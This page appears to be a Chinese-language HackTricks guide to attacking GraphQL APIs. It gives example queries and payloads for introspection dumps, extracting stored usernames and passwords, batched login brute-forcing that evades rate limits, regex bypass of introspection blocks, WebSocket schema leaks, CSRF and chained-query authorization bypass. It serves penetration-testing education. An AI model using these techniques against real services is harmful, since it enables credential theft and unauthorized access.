<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>GraphQL</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="graphql"><a class="header" href="#graphql">GraphQL</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
<p>通过 8kSec 学院深化您在 <strong>移动安全</strong> 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<h2 id="介绍"><a class="header" href="#介绍">介绍</a></h2>
<p>GraphQL 被 <strong>强调</strong> 为 <strong>REST API 的高效替代方案</strong>，提供了一种简化的从后端查询数据的方法。与 REST 相比，REST 通常需要在不同的端点之间进行多次请求以收集数据，而 GraphQL 允许通过 <strong>单个请求</strong> 获取所有所需的信息。这种简化显著 <strong>有利于开发人员</strong>，减少了他们的数据获取过程的复杂性。</p>
<h2 id="graphql-和安全性"><a class="header" href="#graphql-和安全性">GraphQL 和安全性</a></h2>
<p>随着新技术的出现，包括 GraphQL，新的安全漏洞也随之而来。一个关键点是 <strong>GraphQL 默认不包含身份验证机制</strong>。开发人员有责任实施这些安全措施。没有适当的身份验证，GraphQL 端点可能会向未认证用户暴露敏感信息，构成重大安全风险。</p>
<h3 id="目录暴力攻击与-graphql"><a class="header" href="#目录暴力攻击与-graphql">目录暴力攻击与 GraphQL</a></h3>
<p>为了识别暴露的 GraphQL 实例，建议在目录暴力攻击中包含特定路径。这些路径包括：</p>
<ul>
<li><code>/graphql</code></li>
<li><code>/graphiql</code></li>
<li><code>/graphql.php</code></li>
<li><code>/graphql/console</code></li>
<li><code>/api</code></li>
<li><code>/api/graphql</code></li>
<li><code>/graphql/api</code></li>
<li><code>/graphql/graphql</code></li>
</ul>
<p>识别开放的 GraphQL 实例可以检查支持的查询。这对于理解通过端点访问的数据至关重要。GraphQL 的自省系统通过详细说明模式支持的查询来促进这一点。有关更多信息，请参阅 GraphQL 关于自省的文档：<a href="https://graphql.org/learn/introspection/"><strong>GraphQL：API 的查询语言。</strong></a></p>
<h3 id="指纹识别"><a class="header" href="#指纹识别">指纹识别</a></h3>
<p>工具 <a href="https://github.com/dolevf/graphw00f"><strong>graphw00f</strong></a> 能够检测服务器使用的 GraphQL 引擎，并打印一些对安全审计员有帮助的信息。</p>
<h4 id="通用查询"><a class="header" href="#通用查询">通用查询 <a href="#universal-queries" id="universal-queries"></a></a></h4>
<p>要检查 URL 是否为 GraphQL 服务，可以发送一个 <strong>通用查询</strong>，<code>query{__typename}</code>。如果响应包含 <code>{"data": {"__typename": "Query"}}</code>，则确认该 URL 托管了一个 GraphQL 端点。此方法依赖于 GraphQL 的 <code>__typename</code> 字段，该字段揭示了被查询对象的类型。</p>
<pre><code class="language-javascript">query{__typename}
</code></pre>
<h3 id="基本枚举"><a class="header" href="#基本枚举">基本枚举</a></h3>
<p>Graphql 通常支持 <strong>GET</strong>、<strong>POST</strong> (x-www-form-urlencoded) 和 <strong>POST</strong>(json)。虽然出于安全考虑，建议仅允许 json 以防止 CSRF 攻击。</p>
<h4 id="反向工程"><a class="header" href="#反向工程">反向工程</a></h4>
<p>要使用反向工程发现架构信息，请查询 <code>__schema</code> 字段。该字段在所有查询的根类型上可用。</p>
<pre><code class="language-bash">query={__schema{types{name,fields{name}}}}
</code></pre>
<p>通过此查询，您将找到所有正在使用的类型的名称：</p>
<p><img src="../../.gitbook/assets/image%20(1036).png" alt="" /></p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
</code></pre>
<p>{% endcode %}</p>
<p>通过这个查询，您可以提取所有类型、它的字段和它的参数（以及参数的类型）。这将非常有助于了解如何查询数据库。</p>
<p><img src="../../.gitbook/assets/image%20(950).png" alt="" /></p>
<p><strong>错误</strong></p>
<p>了解<strong>错误</strong>是否会被<strong>显示</strong>是很有趣的，因为它们将提供有用的<strong>信息。</strong></p>
<pre><code>?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
</code></pre>
<p><img src="../../.gitbook/assets/image%20(416).png" alt="" /></p>
<p><strong>通过自省枚举数据库模式</strong></p>
<p>{% hint style="info" %}
如果自省已启用但上述查询无法运行，请尝试从查询结构中删除 <code>onOperation</code>、<code>onFragment</code> 和 <code>onField</code> 指令。
{% endhint %}</p>
<pre><code class="language-bash">#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
</code></pre>
<p>内联自省查询：</p>
<pre><code>/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
</code></pre>
<p>最后一行代码是一个graphql查询，它将转储所有来自graphql的元信息（对象名称、参数、类型...）</p>
<p><img src="../../.gitbook/assets/image%20(363).png" alt="" /></p>
<p>如果启用了自省，您可以使用 <a href="https://github.com/APIs-guru/graphql-voyager"><strong>GraphQL Voyager</strong></a> 在图形用户界面中查看所有选项。</p>
<h3 id="查询"><a class="header" href="#查询">查询</a></h3>
<p>现在我们知道数据库中保存了哪种信息，让我们尝试<strong>提取一些值</strong>。</p>
<p>在自省中，您可以找到<strong>可以直接查询的对象</strong>（因为您不能仅仅因为对象存在就查询它）。在下图中，您可以看到“<em>queryType</em>”被称为“<em>Query</em>”，而“<em>Query</em>”对象的一个字段是“<em>flags</em>”，这也是一种对象类型。因此，您可以查询标志对象。</p>
<p><img src="../../.gitbook/assets/Screenshot%20from%202021-03-13%2018-17-48.png" alt="" /></p>
<p>请注意，查询“<em>flags</em>”的类型是“<em>Flags</em>”，该对象定义如下：</p>
<p><img src="../../.gitbook/assets/Screenshot%20from%202021-03-13%2018-22-57%20(1).png" alt="" /></p>
<p>您可以看到“<em>Flags</em>”对象由<strong>name</strong>和<strong>value</strong>组成。然后，您可以使用以下查询获取所有标志的名称和值：</p>
<pre><code class="language-javascript">query={flags{name, value}}
</code></pre>
<p>注意，如果<strong>查询的对象</strong>是像<strong>字符串</strong>这样的<strong>原始****类型</strong>，如以下示例所示</p>
<p><img src="../../.gitbook/assets/image%20(958).png" alt="" /></p>
<p>您可以直接查询：</p>
<pre><code class="language-javascript">query={hiddenFlags}
</code></pre>
<p>在另一个例子中，"<em>Query</em>" 类型对象中有两个对象："<em>user</em>" 和 "<em>users</em>"。<br />
如果这些对象不需要任何参数进行搜索，可以通过<strong>请求</strong>所需的数据来<strong>检索所有信息</strong>。在这个互联网示例中，你可以提取保存的用户名和密码：</p>
<p><img src="../../.gitbook/assets/image%20(880).png" alt="" /></p>
<p>然而，在这个例子中，如果你尝试这样做，你会得到这个<strong>错误</strong>：</p>
<p><img src="../../.gitbook/assets/image%20(1042).png" alt="" /></p>
<p>看起来它会使用类型为 <em><strong>Int</strong></em> 的 "<em><strong>uid</strong></em>" 参数进行搜索。<br />
无论如何，我们已经知道，在 <a href="graphql.html#basic-enumeration">Basic Enumeration</a> 部分提出了一个查询，显示了所有所需的信息：<code>query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}</code></p>
<p>如果你阅读我运行该查询时提供的图像，你会看到 "<em><strong>user</strong></em>" 有一个类型为 <em>Int</em> 的 <strong>arg</strong> "<em><strong>uid</strong></em>"。</p>
<p>因此，通过一些轻量级的 <em><strong>uid</strong></em> 暴力破解，我发现 <em><strong>uid</strong>=<strong>1</strong></em> 时检索到了一个用户名和一个密码：<br />
<code>query={user(uid:1){user,password}}</code></p>
<p><img src="../../.gitbook/assets/image%20(90).png" alt="" /></p>
<p>注意，我<strong>发现</strong>我可以请求 <strong>参数</strong> "<em><strong>user</strong></em>" 和 "<em><strong>password</strong></em>"，因为如果我尝试查找不存在的内容 (<code>query={user(uid:1){noExists}}</code>)，我会得到这个错误：</p>
<p><img src="../../.gitbook/assets/image%20(707).png" alt="" /></p>
<p>在<strong>枚举阶段</strong>，我发现 "<em><strong>dbuser</strong></em>" 对象的字段有 "<em><strong>user</strong></em>" 和 "<em><strong>password</strong></em>"。</p>
<p><strong>查询字符串转储技巧（感谢 @BinaryShadow_）</strong></p>
<p>如果你可以通过字符串类型进行搜索，例如：<code>query={theusers(description: ""){username,password}}</code>，并且你<strong>搜索一个空字符串</strong>，它将<strong>转储所有数据</strong>。 (<em>注意这个例子与教程的例子无关，对于这个例子假设你可以通过一个名为 "<strong>description</strong>" 的字符串字段使用 "<strong>theusers</strong>" 进行搜索</em>).</p>
<h3 id="搜索"><a class="header" href="#搜索">搜索</a></h3>
<p>在这个设置中，一个<strong>数据库</strong>包含<strong>人员</strong>和<strong>电影</strong>。<strong>人员</strong>通过他们的<strong>电子邮件</strong>和<strong>姓名</strong>进行识别；<strong>电影</strong>通过它们的<strong>名称</strong>和<strong>评分</strong>进行识别。<strong>人员</strong>可以互为朋友，也可以拥有电影，表示数据库中的关系。</p>
<p>你可以通过<strong>姓名</strong>搜索人员并获取他们的电子邮件：</p>
<pre><code class="language-javascript">{
searchPerson(name: "John Doe") {
email
}
}
</code></pre>
<p>您可以通过<strong>名称</strong>搜索人员并获取他们的<strong>订阅</strong>的<strong>电影</strong>：</p>
<pre><code class="language-javascript">{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
</code></pre>
<p>注意如何指示检索该人的 <code>subscribedMovies</code> 的 <code>name</code>。</p>
<p>您还可以<strong>同时搜索多个对象</strong>。在这种情况下，搜索了 2 部电影：</p>
<pre><code class="language-javascript">{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
</code></pre>
<p>或者甚至<strong>使用别名的多个不同对象的关系</strong>：</p>
<pre><code class="language-javascript">{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
</code></pre>
<h3 id="mutations"><a class="header" href="#mutations">Mutations</a></h3>
<p><strong>变更用于在服务器端进行更改。</strong></p>
<p>在<strong>自省</strong>中，您可以找到<strong>声明的</strong> <strong>变更</strong>。在下图中，"<em>MutationType</em>" 被称为 "<em>Mutation</em>"，而 "<em>Mutation</em>" 对象包含变更的名称（在本例中为 "<em>addPerson</em>"）：</p>
<p><img src="../../.gitbook/assets/Screenshot%20from%202021-03-13%2018-26-27%20(1).png" alt="" /></p>
<p>在此设置中，<strong>数据库</strong>包含<strong>人员</strong>和<strong>电影</strong>。<strong>人员</strong>通过他们的<strong>电子邮件</strong>和<strong>姓名</strong>进行识别；<strong>电影</strong>通过它们的<strong>名称</strong>和<strong>评分</strong>进行识别。<strong>人员</strong>可以彼此成为朋友，并且也可以拥有电影，表示数据库中的关系。</p>
<p>一个<strong>在数据库中创建新</strong>电影的变更可以像以下示例（在此示例中，变更被称为 <code>addMovie</code>）：</p>
<pre><code class="language-javascript">mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
</code></pre>
<p><strong>注意查询中如何指示值和数据类型。</strong></p>
<p>此外，数据库支持一个<strong>mutation</strong>操作，名为<code>addPerson</code>，允许创建<strong>persons</strong>及其与现有<strong>friends</strong>和<strong>movies</strong>的关联。重要的是要注意，朋友和电影必须在数据库中预先存在，才能将它们链接到新创建的人。</p>
<pre><code class="language-javascript">mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
</code></pre>
<h3 id="指令重载"><a class="header" href="#指令重载">指令重载</a></h3>
<p>如<a href="https://www.landh.tech/blog/20240304-google-hack-50000/"><strong>本报告中描述的漏洞之一</strong></a>所述，指令重载意味着调用指令甚至数百万次，以使服务器浪费操作，直到可能导致拒绝服务（DoS）。</p>
<h3 id="在1个api请求中批量暴力破解"><a class="header" href="#在1个api请求中批量暴力破解">在1个API请求中批量暴力破解</a></h3>
<p>此信息来自<a href="https://lab.wallarm.com/graphql-batching-attack/">https://lab.wallarm.com/graphql-batching-attack/</a>。<br />
通过GraphQL API进行身份验证，<strong>同时发送多个不同凭据的查询</strong>进行检查。这是一种经典的暴力破解攻击，但现在由于GraphQL批量处理功能，可以在每个HTTP请求中发送多个登录/密码对。这种方法会欺骗外部速率监控应用程序，使其认为一切正常，没有暴力破解机器人试图猜测密码。</p>
<p>下面是一个应用程序身份验证请求的最简单演示，<strong>一次有3个不同的电子邮件/密码对</strong>。显然，可以以相同的方式在单个请求中发送数千个：</p>
<p><img src="../../.gitbook/assets/image%20(1081).png" alt="" /></p>
<p>从响应截图中可以看到，第一个和第三个请求返回了_null_，并在_error_部分反映了相应的信息。<strong>第二个变更具有正确的身份验证</strong>数据，响应中包含正确的身份验证会话令牌。</p>
<p><img src="../../.gitbook/assets/image%20(119)%20(1).png" alt="" /></p>
<h2 id="无需自省的graphql"><a class="header" href="#无需自省的graphql">无需自省的GraphQL</a></h2>
<p>越来越多的<strong>graphql端点正在禁用自省</strong>。然而，当收到意外请求时，graphql抛出的错误足以让像<a href="https://github.com/nikitastupin/clairvoyance"><strong>clairvoyance</strong></a>这样的工具重建大部分架构。</p>
<p>此外，Burp Suite扩展<a href="https://github.com/forcesunseen/graphquail"><strong>GraphQuail</strong></a> <strong>观察通过Burp的GraphQL API请求</strong>并<strong>构建</strong>一个内部GraphQL <strong>架构</strong>，每当它看到新的查询时。它还可以为GraphiQL和Voyager公开架构。当收到自省查询时，该扩展返回一个假响应。因此，GraphQuail显示了API中可用的所有查询、参数和字段。有关更多信息，请<a href="https://blog.forcesunseen.com/graphql-security-testing-without-a-schema"><strong>查看此处</strong></a>。</p>
<p>一个很好的<strong>词表</strong>可以在这里发现<a href="https://github.com/Escape-Technologies/graphql-wordlist?"><strong>GraphQL实体</strong></a>。</p>
<h3 id="绕过graphql自省防御"><a class="header" href="#绕过graphql自省防御">绕过GraphQL自省防御 <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a></a></h3>
<p>为了绕过API中对自省查询的限制，在<code>__schema</code>关键字后插入<strong>特殊字符</strong>被证明是有效的。这种方法利用了开发人员在正则表达式模式中的常见疏忽，这些模式旨在通过关注<code>__schema</code>关键字来阻止自省。通过添加像<strong>空格、换行符和逗号</strong>这样的字符，GraphQL会忽略这些字符，但正则表达式可能没有考虑到，从而可以绕过限制。例如，在<code>__schema</code>后面带有换行符的自省查询可能会绕过这样的防御：</p>
<pre><code class="language-bash"># Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
</code></pre>
<p>如果不成功，请考虑其他请求方法，例如 <strong>GET 请求</strong> 或 <strong>使用 <code>x-www-form-urlencoded</code> 的 POST 请求</strong>，因为限制可能仅适用于 POST 请求。</p>
<h3 id="尝试-websockets"><a class="header" href="#尝试-websockets">尝试 WebSockets</a></h3>
<p>正如在 <a href="https://www.youtube.com/watch?v=tIo_t5uUK50"><strong>这个演讲</strong></a> 中提到的，检查是否可以通过 WebSockets 连接到 graphQL，因为这可能允许您绕过潜在的 WAF，并使 websocket 通信泄露 graphQL 的架构：</p>
<pre><code class="language-javascript">ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
</code></pre>
<h3 id="发现暴露的-graphql-结构"><a class="header" href="#发现暴露的-graphql-结构"><strong>发现暴露的 GraphQL 结构</strong></a></h3>
<p>当 introspection 被禁用时，检查网站源代码中 JavaScript 库中预加载的查询是一种有效的策略。这些查询可以通过开发者工具中的 <code>Sources</code> 选项卡找到，提供有关 API 架构的见解，并揭示潜在的 <strong>暴露敏感查询</strong>。在开发者工具中搜索的命令是：</p>
<pre><code class="language-javascript">Inspect/Sources/"Search all files"
file:* mutation
file:* query
</code></pre>
<h2 id="csrf-in-graphql"><a class="header" href="#csrf-in-graphql">CSRF in GraphQL</a></h2>
<p>如果你不知道什么是 CSRF，请阅读以下页面：</p>
<p>{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
<a href="../../pentesting-web/csrf-cross-site-request-forgery.html">csrf-cross-site-request-forgery.md</a>
{% endcontent-ref %}</p>
<p>在外面，你将能够找到几个 <strong>未配置 CSRF 令牌的</strong> GraphQL 端点。</p>
<p>请注意，GraphQL 请求通常通过使用 Content-Type <strong><code>application/json</code></strong> 的 POST 请求发送。</p>
<pre><code class="language-javascript">{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
</code></pre>
<p>然而，大多数 GraphQL 端点也支持 <strong><code>form-urlencoded</code> POST 请求：</strong></p>
<pre><code class="language-javascript">query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
</code></pre>
<p>因此，像之前那样的 CSRF 请求是 <strong>在没有预检请求的情况下</strong> 发送的，因此可以 <strong>利用</strong> <strong>CSRF</strong> 在 GraphQL 中 <strong>进行</strong> <strong>更改</strong>。</p>
<p>但是，请注意，Chrome 的 <code>samesite</code> 标志的新默认 cookie 值为 <code>Lax</code>。这意味着 cookie 仅会在 GET 请求中从第三方网站发送。</p>
<p>请注意，通常也可以将 <strong>查询</strong> <strong>请求</strong> 作为 <strong>GET</strong> <strong>请求</strong> 发送，并且 CSRF 令牌可能不会在 GET 请求中进行验证。</p>
<p>此外，利用 <a href="../../pentesting-web/xs-search/"><strong>XS-Search</strong></a> <strong>攻击</strong> 可能能够利用用户的凭据从 GraphQL 端点中提取内容。</p>
<p>有关更多信息，请 <strong>查看</strong> <a href="https://blog.doyensec.com/2021/05/20/graphql-csrf.html"><strong>原始帖子</strong></a>。</p>
<h2 id="graphql-中的跨站-websocket-劫持"><a class="header" href="#graphql-中的跨站-websocket-劫持">GraphQL 中的跨站 WebSocket 劫持</a></h2>
<p>类似于利用 GraphQL 的 CRSF 漏洞，也可以执行 <strong>跨站 WebSocket 劫持，以利用未保护的 cookie 进行 GraphQL 身份验证</strong>，并使用户在 GraphQL 中执行意外操作。</p>
<p>有关更多信息，请查看：</p>
<p>{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
<a href="../../pentesting-web/websocket-attacks.html">websocket-attacks.md</a>
{% endcontent-ref %}</p>
<h2 id="graphql-中的授权"><a class="header" href="#graphql-中的授权">GraphQL 中的授权</a></h2>
<p>在端点上定义的许多 GraphQL 函数可能仅检查请求者的身份验证，而不检查授权。</p>
<p>修改查询输入变量可能导致敏感账户详细信息 <a href="https://hackerone.com/reports/792927">泄露</a>。</p>
<p>突变甚至可能导致账户接管，试图修改其他账户数据。</p>
<pre><code class="language-javascript">{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
</code></pre>
<h3 id="绕过-graphql-中的授权"><a class="header" href="#绕过-graphql-中的授权">绕过 GraphQL 中的授权</a></h3>
<p><a href="https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln">将查询链接</a>在一起可以绕过一个弱认证系统。</p>
<p>在下面的示例中，您可以看到操作是“forgotPassword”，并且它应该只执行与之相关的 forgotPassword 查询。通过在末尾添加一个查询可以绕过这一点，在这种情况下，我们添加“register”和一个用户变量，以便系统注册为新用户。</p>
<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>
<h2 id="使用-graphql-中的别名绕过速率限制"><a class="header" href="#使用-graphql-中的别名绕过速率限制">使用 GraphQL 中的别名绕过速率限制</a></h2>
<p>在 GraphQL 中，别名是一个强大的功能，允许在进行 API 请求时<strong>明确命名属性</strong>。这个功能对于在单个请求中检索<strong>同一类型的多个实例</strong>特别有用。别名可以用来克服 GraphQL 对象不能具有多个同名属性的限制。</p>
